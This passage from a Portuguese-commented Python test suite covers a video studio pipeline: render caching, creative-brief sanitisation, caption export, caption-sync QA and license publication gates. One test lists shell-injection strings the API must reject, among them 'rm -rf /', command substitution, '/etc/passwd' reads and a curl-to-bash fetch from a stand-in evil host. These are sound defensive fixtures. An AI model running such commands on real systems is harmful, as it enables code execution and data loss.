    assert dup.run.run_id == creation_1.run.run_id

    # Novo PlanFfmpegRenderer após restart reusa 100% do cache do Postgres (0 chamadas FFmpeg!)
    p2_ffmpeg_calls: list[list[str]] = []
    renderer_2 = PlanFfmpegRenderer(
        plans=plan_repo_2,
        cache_root=cache_dir,
        runner=lambda cmd, timeout=600: p2_ffmpeg_calls.append(list(cmd)),
    )
    spec_p2 = RenderSpec(
        scenes=scenes_reloaded,
        images=images_1,
        speech_wavs=[wav0, wav1],
        scene_seconds=[2.0, 2.0],
        cues=[],
        format=VideoFormat.short,
        music=False,
        work_dir=tmp_path / "work_p2",
        config_snapshot=config_snapshot_for(stored_cfg.config),
        creative_brief=video_reloaded.creative_brief,
    )
    out_p2 = renderer_2.render(spec_p2, tmp_path / "p2_final.mp4")
    assert out_p2.is_file() and out_p2.stat().st_size > 0
    assert len(p2_ffmpeg_calls) == 0, f"Após restart com plano idêntico, FFmpeg não deve rodar (rodou {len(p2_ffmpeg_calls)}x)"


# ==============================================================================
# (d.1) Creative Direction: Sanitização (PT-BR OK + Injeções 422) & Fluxo Brief -> Script/Long/RenderPlan
# ==============================================================================

def test_pipeline_creative_direction_sanitization_ptbr_and_injections(conn, dsn, tmp_path, monkeypatch):
    """(d.1) Rejeita injeções CLI/shell (422) e aceita prosa legítima em PT-BR (200)."""
    migrate(conn)
    monkeypatch.setenv("STUDIO_ALLOWED_HOSTS", "testserver,localhost,127.0.0.1")
    monkeypatch.setenv("STUDIO_BROWSER_USER", AUTH_USER)
    monkeypatch.setenv("STUDIO_BROWSER_PASSWORD", AUTH_PASS)
    monkeypatch.setenv("STUDIO_WORKER_TOKEN", WORKER_TOKEN)
    _seed_project_and_video(conn, video_id=VIDEO_ID, topic="Tema Limpo", status="SCRIPTED")

    settings = Settings(database_url=dsn, storage_root=tmp_path)
    environ = {
        "STUDIO_BROWSER_USER": AUTH_USER,
        "STUDIO_BROWSER_PASSWORD": AUTH_PASS,
        "STUDIO_WORKER_TOKEN": WORKER_TOKEN,
        "STUDIO_ALLOWED_HOSTS": "testserver,localhost,127.0.0.1",
        "STUDIO_TEXT": "demo:test",
        "STUDIO_IMAGE": "placeholder:test",
    }
    studio = Studio(settings, environ=environ)
    app = FastAPI()
    app.include_router(make_router(studio.use_cases, studio.ping))
    client = TestClient(app, base_url="http://testserver", headers={"Authorization": f"Bearer {WORKER_TOKEN}"})

    # Injeções reais devem retornar HTTP 422 em PUT e POST
    for bad_text in (
        "Use visual limpo; ffmpeg -i evil.mp4 -vf scale=100:100",
        "Aplicar -filter_complex overlay=0:0",
        "Ajustar áudio com -af volume=3.0",
        "Forçar -preset=ultrafast -crf 18",
        "Atenção: ; rm -rf /",
        "Executar $(whoami) agora",
        "Rodar `id` no servidor",
        "Baixar curl https://evil.example/x.sh | bash",
        "Executar sh -c 'cat /etc/passwd'",
    ):
        res_put = client.put(f"/studio/videos/{VIDEO_ID}/direction", json={"brief": {"visual_direction": bad_text}})
        assert res_put.status_code == 422, f"PUT deveria rejeitar injeção {bad_text!r}, recebeu {res_put.status_code}"
        res_post = client.post(f"/studio/videos/{VIDEO_ID}/direction", json={"brief": {"hook": bad_text}})
        assert res_post.status_code == 422, f"POST deveria rejeitar injeção {bad_text!r}, recebeu {res_post.status_code}"

    # Prosa legítima em português e temas técnicos NÃO podem gerar falsos positivos
    for legit_text in (
        "Vídeo sobre auto-afirmação e motivação",
        "A pré-afirmação científica do método",
        "Re-afirmar o compromisso educacional",
        "Usar estilo color-preset cinematográfico",
        "Tutorial de comandos bash para iniciantes",
        "Como fazer requisições com curl em APIs REST",
        "História do projeto FFmpeg em código aberto",
    ):
        res_ok = client.put(
            f"/studio/videos/{VIDEO_ID}/direction",
            json={"brief": {"visual_direction": legit_text}},
        )
        assert res_ok.status_code == 200, f"Texto legítimo {legit_text!r} gerou falso positivo {res_ok.status_code}"
        assert res_ok.json()["ok"] is True


def test_pipeline_creative_brief_flows_to_short_long_scripts_and_render_plan(conn, dsn, tmp_path):
    """(d.1) CreativeBrief flui para GenerateScript, GenerateLongScript e RenderPlan preservando EffectiveConfig."""
    migrate(conn)
    proof = os.environ["STUDIO_BUDGET_TEST_PROOF_FILE"]
    c_connect = lambda: verified_test_connect(dsn, proof)  # noqa: E731

    video_repo = PostgresVideoRepository(c_connect)
    snaps_repo = PostgresSnapshotRepository(c_connect)
    scripts_repo = PostgresScriptRepository(c_connect)
    usage_repo = PostgresUsageRepository(c_connect)

    brief_fast = {
        "schema_version": 1,
        "topic": "Tema Roteiro",
        "narrative_goal": "Objetivo Criativo Dinâmico",
        "hook": "Gancho exclusivo do diretor criativo",
        "content_structure": ["Ato 1", "Ato 2"],
        "tone": "Enérgico",
        "pacing": "dynamic",
        "visual_direction": "Visuais dinâmicos e contrastados",
        "recommended_media_types": ["image", "video"],
        "caption_strategy": "Palavra ativa",
        "audio_guidance": "Trilha animada",
    }

    # 1. GenerateScript (short) consome video.creative_brief automaticamente
    _seed_project_and_video(conn, video_id=VIDEO_ID, topic="Tema Roteiro", fmt="short", status="IDEA")
    video_repo.update_video_creative_brief(VIDEO_ID, brief_fast)
    snaps_repo.add(
        VIDEO_ID,
        "https://example.com/fact",
        "Em 1956, pesquisadores em Dartmouth lançaram a inovação tecnológica e a computação moderna.",
    )

    short_prompts: list[str] = []

    class _ShortModel(TextModel):
        name = "capture"
        model = "capture-v1"

        def cost_estimate(self, prompt: str) -> float:
            return 0.0

        def complete(self, prompt: str, json_schema: dict | None = None) -> TextResult:
            short_prompts.append(prompt)
            m = re.findall(r"\[([a-f0-9]+)\]", prompt)
            cid = m[0] if m else "c1"
            resp = (
                '{"scenes": ['
                f'{{"narration": "Texto cena 1 sobre inovação tecnológica.", "caption": "Inovação", "label": "C1", "image_prompt": "Prompt cena 1 ilustrativa", "claim_ids": ["{cid}"]}},'
                f'{{"narration": "Texto cena 2 sobre computação moderna.", "caption": "Computação", "label": "C2", "image_prompt": "Prompt cena 2 ilustrativa", "claim_ids": ["{cid}"]}}'
                "]}"
            )
            return TextResult(text=resp, usage=UsageEntry(step="script", provider="dummy", model="capture", cost_usd=0.0))

    gen_short = GenerateScript(
        videos=video_repo, snaps=snaps_repo, scripts=scripts_repo,
        text_model=_ShortModel(), guard=CostGuard(usage_repo, 10.0, 100.0), usage=usage_repo,
    )
    script = gen_short.execute(VIDEO_ID, scene_count=2)
    assert script is not None and len(short_prompts) == 1
    assert "Gancho exclusivo do diretor criativo" in short_prompts[0]
    assert "Visuais dinâmicos e contrastados" in short_prompts[0]

    # Brief malformado persistido NÃO é engolido silenciosamente
    video_repo.update_video_creative_brief(VIDEO_ID, {"broken": "schema"})
    with pytest.raises(ValueError, match="invalid persisted creative_brief"):
        gen_short.execute(VIDEO_ID, scene_count=2)

    # 2. GenerateLongScript (long) consome video.creative_brief em outline e scenes
    _seed_project_and_video(conn, video_id=VIDEO_ID_2, topic="Computação Longa", fmt="long", status="IDEA")
    video_repo.update_video_creative_brief(VIDEO_ID_2, brief_fast)
    snaps_repo.add(
        VIDEO_ID_2,
        "https://example.com/long",
        "Em 1956, a computação moderna começou nos laboratórios da Universidade de Dartmouth. "
        "Em 1971, os primeiros circuitos integrados da Intel reduziram o tamanho das máquinas. "
        "Na década de 1990, os sistemas distribuídos conectaram continentes inteiros pela Internet.",
    )
    long_prompts: list[str] = []

    class _LongModel(TextModel):
        name = "capture-long"
        model = "capture-long-v1"

        def cost_estimate(self, prompt: str) -> float:
            return 0.0

        def complete(self, prompt: str, json_schema: dict | None = None) -> TextResult:
            long_prompts.append(prompt)
            cids = re.findall(r"\[([a-f0-9]+)\]", prompt)
            cid = cids[0] if cids else "c1"
            if '"chapters"' in prompt:
                resp = (
                    '{"chapters": ['
                    f'{{"title": "Gancho", "block": "hook", "scene_count": 2, "references": ["{cid}"]}},'
                    f'{{"title": "Contexto", "block": "context", "scene_count": 2, "references": ["{cid}"]}},'
                    f'{{"title": "Desenvolvimento", "block": "development", "scene_count": 2, "references": ["{cid}"]}},'
                    f'{{"title": "Fechamento", "block": "payoff", "scene_count": 2, "references": ["{cid}"]}}'
                    "]}"
                )
            else:
                ordinals = ("primeira", "segunda", "terceira", "quarta", "quinta", "sexta", "sétima", "oitava")
                scenes_json = ",".join(
                    f'{{"narration": "Na {word} parte explicamos a computação moderna e os sistemas distribuídos com clareza didática.", '
                    f'"caption": "Parte {word}", "label": "Parte {word}", '
                    f'"image_prompt": "Cena ilustrativa detalhada de tecnologia da {word} etapa", "claim_ids": ["{cid}"]}}'
                    for word in ordinals
                )
                resp = f'{{"scenes": [{scenes_json}]}}'
            return TextResult(text=resp, usage=UsageEntry(step="script", provider="dummy", model="capture-long", cost_usd=0.0))

    gen_long = GenerateLongScript(
        videos=video_repo, snaps=snaps_repo, scripts=scripts_repo,
        text_model=_LongModel(), guard=CostGuard(usage_repo, 10.0, 100.0), usage=usage_repo,
        longform=scripts_repo, target_seconds=30.0, tolerance=0.95,
    )
    long_res = gen_long.execute(VIDEO_ID_2, target_seconds=30.0)
    assert long_res.script is not None and len(long_prompts) == 2
    assert "Gancho exclusivo do diretor criativo" in long_prompts[0]
    assert "Gancho exclusivo do diretor criativo" in long_prompts[1]
    assert "Visuais dinâmicos e contrastados" in long_prompts[1]

    # 3. RenderPlan reflete o CreativeBrief (pacing/motion/bpm/tone) mantendo config_snapshot congelado!
    img0 = _png_file(tmp_path / "p_img0.png", (70, 130, 190))
    wav0 = tmp_path / "p_wav0.wav"
    _tone_wav(wav0, 3.0)
    row = StoryboardRow(
        id=SCENE_0_ID, video_id=VIDEO_ID, idx=0,
        narration="Narração longa o bastante para testar pacing e movimento.",
        label="C0", caption="C0", image_prompt="Prompt ilustrativo detalhado", asset_id=AST_0_ID,
    )
    frozen_cfg = resolve_effective_config(
        video=Video(id=VIDEO_ID, project_id=PROJECT_ID, topic="Tema Roteiro", format=VideoFormat.short)
    )
    snap = config_snapshot_for(frozen_cfg)
    renderer = PlanFfmpegRenderer()

    brief_cinematic = {**brief_fast, "pacing": "cinematic", "tone": "Contemplativo", "visual_direction": "Estático e sereno"}
    plan_fast = renderer.qa_inputs(RenderSpec(
        scenes=[row], images=[img0], speech_wavs=[wav0], scene_seconds=[5.0], cues=[],
        format=VideoFormat.short, music=True, config_snapshot=snap, creative_brief=brief_fast,
    )).plan
    plan_slow = renderer.qa_inputs(RenderSpec(
        scenes=[row], images=[img0], speech_wavs=[wav0], scene_seconds=[5.0], cues=[],
        format=VideoFormat.short, music=True, config_snapshot=snap, creative_brief=brief_cinematic,
    )).plan

    music_fast = next(a for a in plan_fast.generated_audio if a.kind == "music")
    music_slow = next(a for a in plan_slow.generated_audio if a.kind == "music")
    assert music_fast.params["bpm"] == 132 and music_fast.params["creative_brief_pacing"] == "dynamic"
    assert music_slow.params["bpm"] == 106 and music_slow.params["creative_brief_pacing"] == "cinematic"
    assert music_fast.params["creative_brief_tone"] == "Enérgico"
    assert music_slow.params["creative_brief_tone"] == "Contemplativo"
    # Pacing dinâmico subdivide mais shots do que cinemático para uma cena de 5s
    assert len(plan_fast.timeline.scenes[0].shots) > len(plan_slow.timeline.scenes[0].shots)
    # Identidade congelada (`config_snapshot`) permanece estritamente idêntica entre regenerações
    assert plan_fast.config_snapshot == snap
    assert plan_slow.config_snapshot == snap
    assert plan_fast.config_snapshot.content_hash == plan_slow.config_snapshot.content_hash


# ==============================================================================
# (d.2) Captions/Export nas Rotas via export_captions_from_plan + Fallback Legado
# ==============================================================================

def test_pipeline_subtitles_routes_use_export_captions_from_plan_with_legacy_fallback(conn, dsn, tmp_path, monkeypatch):
    """(d.2) Rotas `/subtitles`, `/subtitles.vtt` e `/subtitles.ass` usam `export_captions_from_plan`
    quando há RenderPlan persistido e fazem fallback ao `.srt` legado quando não há plano."""
    migrate(conn)
    proof = os.environ["STUDIO_BUDGET_TEST_PROOF_FILE"]
    c_connect = lambda: verified_test_connect(dsn, proof)  # noqa: E731

    monkeypatch.setenv("STUDIO_ALLOWED_HOSTS", "testserver,localhost,127.0.0.1")
    monkeypatch.setenv("STUDIO_BROWSER_USER", AUTH_USER)
    monkeypatch.setenv("STUDIO_BROWSER_PASSWORD", AUTH_PASS)
    monkeypatch.setenv("STUDIO_WORKER_TOKEN", WORKER_TOKEN)

    _seed_project_and_video(conn, video_id=VIDEO_ID, topic="Legendas Plano", status="RENDERED")
    _seed_project_and_video(conn, video_id=VIDEO_ID_2, topic="Legendas Legado", status="RENDERED")

    storage_root = tmp_path / "storage"
    render_files = FileRenderStorage(storage_root)
    plan_repo = PostgresRenderPlanRepository(c_connect)
    asset_repo = PostgresAssetRepository(c_connect)
    job_repo = PostgresRenderJobRepository(c_connect)

    # Vídeo 1: tem RenderPlan persistido com texto específico do plano (diferente do SRT em disco)
    plan = build_render_plan(
        plan_id=f"plan:{VIDEO_ID}",
        revision=1,
        project_id=PROJECT_ID,
        video_id=VIDEO_ID,
        format=VideoFormat.short,
        scenes=[StoryboardScene(scene_id=SCENE_0_ID, asset_id=AST_0_ID,
                                narration="Legenda canônica vinda do RenderPlan.", speech_seconds=2.0)],
        assets=[AssetReference(asset_id=AST_0_ID, asset_version=1, uri="/tmp/a.png",
                               content_sha256="0" * 64, media_type="image", license="cc0-1.0")],
        music=False,
    )
    plan_repo.save_plan(plan)

    # Vídeo 2 (legado): SEM RenderPlan, apenas artefato `.srt` + `.mp4` publicados em disco
    dummy_mp4 = tmp_path / "legacy.mp4"
    dummy_mp4.write_bytes(b"\x00\x00\x00\x18ftypmp42")
    legacy_job, _ = job_repo.enqueue(VIDEO_ID_2, "legacy-hash")
    job_repo.start(legacy_job.id)
    rel_mp4 = render_files.publish(
        PROJECT_ID, VIDEO_ID_2, legacy_job.id, dummy_mp4,
        "1\n00:00:00,000 --> 00:00:01,500\nLegenda do fallback legado em disco.\n",
    )
    out_asset = asset_repo.add(Asset(
        id=uuid.uuid4().hex, kind=AssetKind.video, cache_key=_ck("legacy-key"), path=rel_mp4,
        provider="ffmpeg", model="ffmpeg", license="gerado pelo estúdio a partir de assets licenciados",
    ))
    qa_ok = QaReport(
        render_id=legacy_job.id, checksum="legacy-key", generated_at=datetime.now(timezone.utc),
        coverage=QaCoverage(status="verified"), checks_run=("render.media_metrics",), findings=(),
    )
    job_repo.complete(legacy_job.id, out_asset, qa_ok)

    settings = Settings(database_url=dsn, storage_root=storage_root)
    environ = {
        "STUDIO_BROWSER_USER": AUTH_USER,
        "STUDIO_BROWSER_PASSWORD": AUTH_PASS,
        "STUDIO_WORKER_TOKEN": WORKER_TOKEN,
        "STUDIO_ALLOWED_HOSTS": "testserver,localhost,127.0.0.1",
        "STUDIO_TEXT": "demo:test",
        "STUDIO_IMAGE": "placeholder:test",
    }
    studio = Studio(settings, environ=environ)
    app = FastAPI()
    app.include_router(make_router(studio.use_cases, studio.ping))
    client = TestClient(app, base_url="http://testserver", headers={"Authorization": f"Bearer {WORKER_TOKEN}"})

    # Vídeo 1: todas as 3 rotas vêm do RenderPlan via export_captions_from_plan
    r_srt = client.get(f"/studio/videos/{VIDEO_ID}/subtitles")
    assert r_srt.status_code == 200
    assert r_srt.text == export_captions_from_plan(plan, format_type="srt")
    assert "Legenda canônica vinda do RenderPlan." in r_srt.text

    r_vtt = client.get(f"/studio/videos/{VIDEO_ID}/subtitles.vtt")
    assert r_vtt.status_code == 200
    assert r_vtt.text == export_captions_from_plan(plan, format_type="vtt")
    assert r_vtt.text.startswith("WEBVTT")

    r_ass = client.get(f"/studio/videos/{VIDEO_ID}/subtitles.ass")
    assert r_ass.status_code == 200
    assert "[Script Info]" in r_ass.text
    assert "Legenda canônica vinda do RenderPlan." in r_ass.text

    # Vídeo 2 (legado sem RenderPlan): fallback transparente para SRT/VTT em disco
    r_leg_srt = client.get(f"/studio/videos/{VIDEO_ID_2}/subtitles")
    assert r_leg_srt.status_code == 200
    assert "Legenda do fallback legado em disco." in r_leg_srt.text

    r_leg_vtt = client.get(f"/studio/videos/{VIDEO_ID_2}/subtitles.vtt")
    assert r_leg_vtt.status_code == 200
    assert "WEBVTT" in r_leg_vtt.text and "Legenda do fallback legado em disco." in r_leg_vtt.text


# ==============================================================================
# (d.2) QA `render.caption_sync`: Medição Real, Fail-Closed e Resistente a Mutação
# ==============================================================================

@needs_ffmpeg
def test_pipeline_qa_caption_sync_measured_drift_and_fail_closed_probe(tmp_path):
    """(d.2) Prova `render.caption_sync` via `check_audio_caption_sync`:
    - sincronizado (<=500ms): CHECK_CAPTION_SYNC em checks_run, sem warning;
    - dessincronizado (>500ms): CHECK_CAPTION_SYNC em checks_run + finding WARNING com drift medido;
    - sem medição em evaluate_quality: CHECK_CAPTION_SYNC NÃO aparece em checks_run (sem falso PASS);
    - erro de ffprobe em arquivo corrompido: _probe_duration lança erro (nunca 0.0) e QA fica not_verified.
    (Se o bloco de medição em `quality_ffmpeg.py` for removido, os asserts de checks_run e drift FALHAM.)
    """
    mp4_path = tmp_path / "sync_test.mp4"
    wav_synced = tmp_path / "synced.wav"
    wav_drifted = tmp_path / "drifted.wav"
    wav_corrupt = tmp_path / "corrupt.wav"
    frame_png = _png_file(tmp_path / "frame.png", (30, 120, 180))

    _tone_wav(wav_synced, seconds=2.0)
    _tone_wav(wav_drifted, seconds=5.0)  # 3000ms de drift contra legenda que termina ~2.0s
    wav_corrupt.write_bytes(b"NOT A VALID WAV FILE")

    subprocess.run([
        "ffmpeg", "-y", "-v", "error",
        "-f", "lavfi", "-i", "color=c=blue:s=720x1280:r=25:d=2.8",
        "-f", "lavfi", "-i", "sine=frequency=440:duration=2.8",
        "-c:v", "libx264", "-c:a", "aac", "-pix_fmt", "yuv420p",
        str(mp4_path),
    ], check=True)

    plan = build_render_plan(
        plan_id=f"plan:{VIDEO_ID}",
        revision=1,
        project_id=PROJECT_ID,
        video_id=VIDEO_ID,
        format=VideoFormat.short,
        scenes=[StoryboardScene(scene_id=SCENE_0_ID, asset_id=AST_0_ID,
                                narration="Narração de teste para verificação de sincronismo.", speech_seconds=2.0)],
        assets=[AssetReference(asset_id=AST_0_ID, asset_version=1, uri=str(frame_png),
                               content_sha256="0" * 64, media_type="image", license="cc-by-4.0")],
        music=False,
    )

    evaluator = FfmpegQualityEvaluator()

    # Caso 1: Áudio sincronizado (2.0s vs fim da legenda ~2.4s -> drift <= 500ms)
    report_ok = evaluator.evaluate(
        plan, media_path=mp4_path, narration_path=wav_synced,
        render_id="rnd_sync_ok", checksum="chk_sync_ok",
    )
    assert CHECK_CAPTION_SYNC in report_ok.checks_run
    assert not any(f.check_id == CHECK_CAPTION_SYNC for f in report_ok.findings)

    # Caso 2: Áudio dessincronizado (5.0s vs fim da legenda ~2.4s -> drift > 500ms)
    report_drift = evaluator.evaluate(
        plan, media_path=mp4_path, narration_path=wav_drifted,
        render_id="rnd_sync_bad", checksum="chk_sync_bad",
    )
    assert CHECK_CAPTION_SYNC in report_drift.checks_run
    drift_findings = [f for f in report_drift.findings if f.check_id == CHECK_CAPTION_SYNC]
    assert len(drift_findings) == 1
    assert drift_findings[0].severity == "warning"
    assert "exceeds 500ms threshold" in drift_findings[0].evidence

    # Caso 3: Sem medição no domínio puro -> CHECK_CAPTION_SYNC NÃO pode aparecer em checks_run
    unmeasured_report = evaluate_quality(
        plan,
        QualityEvidence(
            render_id="rnd_unmeasured",
            checksum="chk_unmeasured",
            media={
                "duration_s": 2.8, "width": 1080, "height": 1920, "has_audio": True,
                "integrated_lufs": -16.0, "silence_ratio": 0.1, "black_ratio": 0.0,
                "narration_lufs": -18.0, "narration_silence_ratio": 0.1,
            },
            assets=(),
            generated_at=datetime.now(timezone.utc),
        ),
    )
    assert CHECK_CAPTION_SYNC not in unmeasured_report.checks_run

    # Caso 4: Arquivo corrompido -> _probe_duration lança erro (nunca 0.0) e QA fica fail-closed (not_verified)
    with pytest.raises(RuntimeError):
        _probe_duration(wav_corrupt)

    class _PassAnalyzer:
        def analyze(self, _path, narration=None):
            return {
                "duration_s": 2.8, "width": 1080, "height": 1920, "has_audio": True,
                "integrated_lufs": -16.0, "silence_ratio": 0.1, "black_ratio": 0.0,
                "narration_lufs": -18.0, "narration_silence_ratio": 0.1,
            }

    from app.studio.adapters.quality_ffmpeg import FfmpegQualityProbe
    eval_corrupt = FfmpegQualityEvaluator(probe=FfmpegQualityProbe(analyzer=_PassAnalyzer()))
    report_corrupt = eval_corrupt.evaluate(
        plan, media_path=mp4_path, narration_path=wav_corrupt,
        render_id="rnd_corrupt", checksum="chk_corrupt",
    )
    assert CHECK_CAPTION_SYNC not in report_corrupt.checks_run
    assert report_corrupt.coverage.status == "not_verified"
    assert "caption sync measurement failed" in (report_corrupt.coverage.reason or "")
    assert report_corrupt.is_publishable is False


# ==============================================================================
# (d.3) Licença Fail-Closed: Sem Substring Bypass, Fronteira Limpa e Todos os 4 Gates
# ==============================================================================

def test_pipeline_license_allowlist_no_bypass_and_vendor_boundary():
    """(d.3) + P0-1/P0-2: Allowlist estrita sem substring match e sem nomes de fornecedor no domínio."""
    # Todos os vetores de bypass identificados na revisão devem falhar fechado
    for bypass in (
        "",
        "   ",
        None,
        "non-commercial",
        "not commercial",
        "prohibited commercial use",
        "cc-by-nc-nd-4.0",
        "cc-by-nc-4.0",
        "stolen-cc0-pirated",
        "not public domain",
        "stolen from pexels",
        "gerado por terceiro sem autorizacao",
        "non-commercial ai-generated",
        "ai-generated:",
        "ai-generated:unknown",
        "ai-generated:non-commercial-v1",
        "unknown (gerada localmente pelo estúdio)",
        "cc-by-nc-4.0 (gerada localmente pelo estúdio)",
        "Pexels License",           # domínio é agnóstico a fornecedor (normalizado no adaptador!)
        "Pixabay Content License",  # domínio é agnóstico a fornecedor (normalizado no adaptador!)
    ):
        assert verify_license_provenance(bypass) is False, f"Bypass aceito indevidamente: {bypass!r}"

    # Licenças canônicas + sufixo estrito do estúdio local + ai-generated:<model> válido
    for valid in (
        "CC0",
        "CC0-1.0",
        "CC-BY-4.0",
        "Public Domain",
        "Free Stock",
        "Commercial Stock",
        "OWN_ORIGINAL",
        "gerado pelo estúdio a partir de assets licenciados",
        "CC0-1.0 (gerada localmente pelo estúdio)",
        "ai-generated:openrouter/recraft-v4:free",
    ):
        assert verify_license_provenance(valid) is True, f"Licença válida rejeitada: {valid!r}"

    # Fronteira de adaptador normaliza rótulos exatos de stock, mas rejeita adulterados
    assert verify_license_provenance(normalize_vendor_license("Pexels License")) is True
    assert verify_license_provenance(normalize_vendor_license("Pixabay Content License")) is True
    assert verify_license_provenance(normalize_vendor_license("stolen from pexels")) is False


def test_pipeline_license_blocks_all_publication_gates_including_scene_assets_and_missing(conn, dsn, tmp_path):
    """(d.3) + P1-1: `publication_block_reason`, `Approve`, `ClaimPublication` e `RunPublication`
    bloqueiam fail-closed: (1) licença inválida, (2) asset ausente (`None`), (3) `scene_assets`
    com licença inválida; e `RunPublication(enabled=False)` preserva kill switch em 1º lugar."""
    migrate(conn)
    proof = os.environ["STUDIO_BUDGET_TEST_PROOF_FILE"]
    c_connect = lambda: verified_test_connect(dsn, proof)  # noqa: E731

    _seed_project_and_video(conn, video_id=VIDEO_ID, topic="Vídeo Licenciado", status="IDEA")
    video_repo = PostgresVideoRepository(c_connect)
    script_repo = PostgresScriptRepository(c_connect)
    asset_repo = PostgresAssetRepository(c_connect)
    approval_repo = PostgresApprovalRepository(c_connect)
    intent_repo = PostgresPublicationIntentRepository(approval_repo)
    pub_repo = PostgresPublicationRepository(c_connect)
    job_repo = PostgresRenderJobRepository(c_connect)
    snap_repo = PostgresSnapshotRepository(c_connect)
    storage_root = tmp_path / "storage"
    render_files = FileRenderStorage(storage_root)

    safe_asset = asset_repo.add(Asset(
        id=AST_0_ID, kind=AssetKind.image, cache_key="0" * 64, path="cache/safe.png",
        provider="placeholder", model="m", license="CC0-1.0", attribution="Autor Seguro",
    ))
    unsafe_asset = asset_repo.add(Asset(
        id=AST_1_ID, kind=AssetKind.image, cache_key="1" * 64, path="cache/unsafe.png",
        provider="placeholder", model="m", license="cc-by-nc-nd-4.0", attribution="NC-ND",
    ))
    unsafe_overlay = asset_repo.add(Asset(
        id=AST_OVERLAY_BAD_ID, kind=AssetKind.image, cache_key="8" * 64, path="cache/overlay_bad.png",
        provider="placeholder", model="m", license="non-commercial", attribution="Overlay NC",
    ))

    script_repo.save_and_advance(
        VIDEO_ID,
        "Texto roteiro",
        [SceneDraft(narration="Cena única de validação de licença.", caption="Licença",
                    label="C0", image_prompt="Prompt detalhado da cena", claim_ids=["c1"])],
        ["c1"],
        VideoStatus.IDEA,
        VideoStatus.SCRIPTED,
    )
    scene = script_repo.scenes(VIDEO_ID)[0]

    # Publica artefato MP4 + job + QA aprovado para exercitar Approve, ClaimPublication e RunPublication
    dummy_mp4 = tmp_path / "pub.mp4"
    dummy_mp4.write_bytes(b"\x00\x00\x00\x18ftypmp42")
    job, _ = job_repo.enqueue(VIDEO_ID, "pub-hash")
    job_repo.start(job.id)
    rel_mp4 = render_files.publish(PROJECT_ID, VIDEO_ID, job.id, dummy_mp4, "1\n00:00:00,000 --> 00:00:01,000\nOi\n")
    out_asset = asset_repo.add(Asset(
        id=uuid.uuid4().hex, kind=AssetKind.video, cache_key=_ck("pub-output-video"), path=rel_mp4,
        provider="ffmpeg", model="ffmpeg", license="gerado pelo estúdio a partir de assets licenciados",
    ))
    qa_ok = QaReport(
        render_id=job.id, checksum=out_asset.cache_key, generated_at=datetime.now(timezone.utc),
        coverage=QaCoverage(status="verified"), checks_run=("render.media_metrics",), findings=(),
    )
    conn.execute("UPDATE studio.videos SET status = 'ASSETS_READY' WHERE id = %s", (VIDEO_ID,))
    conn.commit()
    assert job_repo.complete(job.id, out_asset, qa_ok)

    approve = Approve(video_repo, script_repo, approval_repo, assets=asset_repo,
                      license_normalizer=normalize_vendor_license)

    # 1. Asset primário com licença NC-ND bloqueia Approve
    assert asset_repo.swap_scene_asset(VIDEO_ID, scene.id, unsafe_asset.id, scene.asset_id)
    with pytest.raises(StateConflict, match="(?i)unverified license"):
        approve.execute(VIDEO_ID, output_asset_id=out_asset.id)

    # 2. Asset primário seguro (CC0), mas secondary `scene_assets` com licença `non-commercial` bloqueia Approve!
    assert asset_repo.swap_scene_asset(VIDEO_ID, scene.id, safe_asset.id, unsafe_asset.id)
    script_repo.save_scene_assets(scene.id, [
        SceneAsset(id=uuid.uuid4().hex, scene_id=scene.id, asset_id=unsafe_overlay.id,
                   role="overlay", start_s=0.0, end_s=1.0, position=0),
    ])
    with pytest.raises(StateConflict, match="(?i)scene_asset:overlay.*unverified license"):
        approve.execute(VIDEO_ID, output_asset_id=out_asset.id)

    # 3. Remove overlay ruim -> aprova legitimamente -> depois injeta overlay ruim para testar RunPublication & ClaimPublication
    script_repo.save_scene_assets(scene.id, [])
    approved_video, decided = approve.execute(VIDEO_ID, output_asset_id=out_asset.id)
    assert decided is True and approved_video.status is VideoStatus.APPROVED

    # Injeta overlay com licença inválida APÓS aprovação -> publication_block_reason e RunPublication devem BLOQUEAR!
    script_repo.save_scene_assets(scene.id, [
        SceneAsset(id=uuid.uuid4().hex, scene_id=scene.id, asset_id=unsafe_overlay.id,
                   role="overlay", start_s=0.0, end_s=1.0, position=0),
    ])
    v_now = video_repo.get_video(VIDEO_ID)
    block_msg = publication_block_reason(
        v_now, intents=intent_repo, approvals=approval_repo, jobs=job_repo,
        scripts=script_repo, assets=asset_repo, license_normalizer=normalize_vendor_license,
    )
    assert block_msg is not None and "unverified license" in block_msg

    # RunPublication efetivo bloqueia ANTES de chamar token ou upload!
    token_calls = 0
    upload_calls = 0

    class _FailTokens:
        def execute(self, _pid):
            nonlocal token_calls
            token_calls += 1
            raise AssertionError("token não pode ser buscado com licença bloqueada")

    class _FailUploader:
        def upload(self, *_a, **_kw):
            nonlocal upload_calls
            upload_calls += 1
            raise AssertionError("upload não pode ocorrer com licença bloqueada")

    # Kill switch disabled=False continua sendo a 1ª guarda sem tocar nada
    run_pub_disabled = RunPublication(
        video_repo, script_repo, asset_repo, job_repo, snap_repo, approval_repo,
        intent_repo, pub_repo, render_files, _FailUploader(), _FailTokens(),
        enabled=False, license_normalizer=normalize_vendor_license,
    )
    res_disabled = run_pub_disabled.execute(video_id=VIDEO_ID)
    assert res_disabled.result is PublicationResult.BLOCKED
    assert "STUDIO_PUBLICATION_ENABLED=0" in (res_disabled.detail or "")
    assert token_calls == 0 and upload_calls == 0

    # Com enabled=True, RunPublication bloqueia por licença (scene_assets) sem tocar token/upload
    run_pub_enabled = RunPublication(
        video_repo, script_repo, asset_repo, job_repo, snap_repo, approval_repo,
        intent_repo, pub_repo, render_files, _FailUploader(), _FailTokens(),
        enabled=True, license_normalizer=normalize_vendor_license,
    )
    res_blocked = run_pub_enabled.execute(video_id=VIDEO_ID)
    assert res_blocked.result is PublicationResult.BLOCKED
    assert "unverified license" in (res_blocked.detail or "")
    assert token_calls == 0 and upload_calls == 0

    # 4. Missing asset (`assets.get(...) == None`) falha fechado em `license_block_reason`, `ClaimPublication` e `Approve`!
    class _MissingAssetRepo:
        def get(self, _aid):
            return None

    missing_err = license_block_reason(VIDEO_ID, scripts=script_repo, assets=_MissingAssetRepo())
    assert missing_err is not None and "missing asset" in missing_err

    # ClaimPublication também bloqueia fail-closed quando asset não existe ou tem licença inválida
    class _StubPubs:
        def __init__(self):
            self.failed: list[str] = []
            self.pub = Publication(id="f" * 32, video_id=VIDEO_ID, status=PublicationStatus.UPLOADING, attempt=1)

        def claim(self, *_a):
            return self.pub

        def fail(self, _pid, _attempt, error):
            self.failed.append(error)
            return True

    stub_pubs = _StubPubs()
    claim = ClaimPublication(
        video_repo, script_repo, _MissingAssetRepo(), job_repo, snap_repo, stub_pubs, render_files,
